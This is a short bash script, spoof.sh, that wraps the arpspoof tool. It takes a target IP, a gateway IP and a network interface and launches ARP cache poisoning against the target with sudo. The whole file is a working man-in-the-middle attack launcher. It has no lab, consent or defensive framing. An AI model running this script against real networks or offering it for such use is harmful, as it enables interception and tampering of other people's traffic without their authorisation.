#!/bin/bash

# spoof.sh - ARP spoofing script

# Function to perform ARP spoofing
arp_spoof() {
    echo "Starting ARP spoofing..."
    echo "Target IP: $1"
    echo "Gateway IP: $2"
    sudo arpspoof -i "$3" -t "$1" "$2"
}

# Check if target IP, gateway IP, and network interface are provided
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <target_ip> <gateway_ip> <interface>"
    exit 1
fi

TARGET_IP=$1
GATEWAY_IP=$2
INTERFACE=$3

arp_spoof "$TARGET_IP" "$GATEWAY_IP" "$INTERFACE"
